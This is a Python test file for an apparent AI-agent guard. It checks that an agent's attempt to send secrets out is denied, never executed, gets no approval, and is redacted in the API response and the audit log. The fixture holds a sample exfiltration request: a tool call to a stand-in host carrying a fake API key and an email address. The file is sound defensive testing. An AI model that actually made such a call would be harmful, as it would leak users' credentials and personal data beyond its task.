"""
Phase 4 enforcement tests: exfiltration is blocked end-to-end through the real
API + SDK, the tool never runs, no approval is created, and no raw secret ever
reaches the API response or the audit database.
"""

from __future__ import annotations

import pytest

from adapter import AutoApprove, GuardedExecutor
from simulator.harness import build_local_guard
from simulator.tools import ToolSandbox, build_registry

GOAL = "Build a React frontend. Do not modify backend or database, and never access secrets."
FAKE_KEY = "sk-ant-api03-" + "Z" * 32
DEST = "https://external.example/upload"


@pytest.fixture
def guard(tmp_path):
    g = build_local_guard(db_path=str(tmp_path / "exfil.db"), api_key="k")
    yield g
    g.close()


@pytest.fixture
def sandbox(tmp_path):
    return ToolSandbox(tmp_path / "fs")


def _exfil_request():
    return {"goal": GOAL, "action": "transmit", "resource": DEST, "resource_kind": "url",
            "tool": "send_external_request", "destination": DEST,
            "payload": f"user_email=alice@example.com API_KEY={FAKE_KEY}", "session_id": "t"}


# 14: tool never executes after exfiltration DENY --------------------------
def test_tool_never_executes_on_exfiltration_deny(guard, sandbox):
    ex = GuardedExecutor(guard.client, build_registry(sandbox), AutoApprove(), session_id="t")
    r = ex.execute("send_external_request", DEST, goal=GOAL, destination=DEST,
                   payload=f"user_email=alice@example.com API_KEY={FAKE_KEY}")
    assert r.decision == "DENY" and r.executed is False
    assert len(sandbox.sent) == 0  # tool_call_count == 0


# 15: exfiltration DENY creates no approval --------------------------------
def test_exfiltration_deny_creates_no_approval(guard):
    res = guard.client.evaluate(_exfil_request())
    assert res["decision"] == "DENY"
    assert res["approval_required"] is False and res["approval_id"] is None
    # And the approvals queue has nothing pending for it.
    approvals = guard.client._request("GET", "/approvals?status=PENDING")  # type: ignore[attr-defined]
    assert all(a["resource"] != DEST for a in approvals["items"])


# 18-19: raw secret never in API response or audit -------------------------
def test_raw_secret_not_in_api_response(guard):
    import json
    res = guard.client.evaluate(_exfil_request())
    assert FAKE_KEY not in json.dumps(res)
    assert res["sensitive_data_detected"] is True
    assert "SECRET" in res["sensitive_categories"]
    assert "PII" in res["sensitive_categories"]


def test_raw_secret_not_in_audit_record(guard):
    import json
    res = guard.client.evaluate(_exfil_request())
    event = guard.client.get_audit_event(res["event_id"])
    assert FAKE_KEY not in json.dumps(event)
    assert event["execution_status"] == "BLOCKED"
    assert "SECRET" in event["sensitive_categories"]
    # redacted fingerprints are present, but never the raw value
    assert event["sensitive"] and all(FAKE_KEY not in s["fingerprint"] for s in event["sensitive"])


# Demonstration-scenario shape: DENY + redacted + not executed -------------
def test_full_exfiltration_scenario(guard):
    from simulator.scenarios import scenario_6_exfiltration
    result, sandbox = scenario_6_exfiltration(guard.client)
    assert result.guard_decision == "DENY"
    assert result.tool_executed is False
    assert len(sandbox.sent) == 0
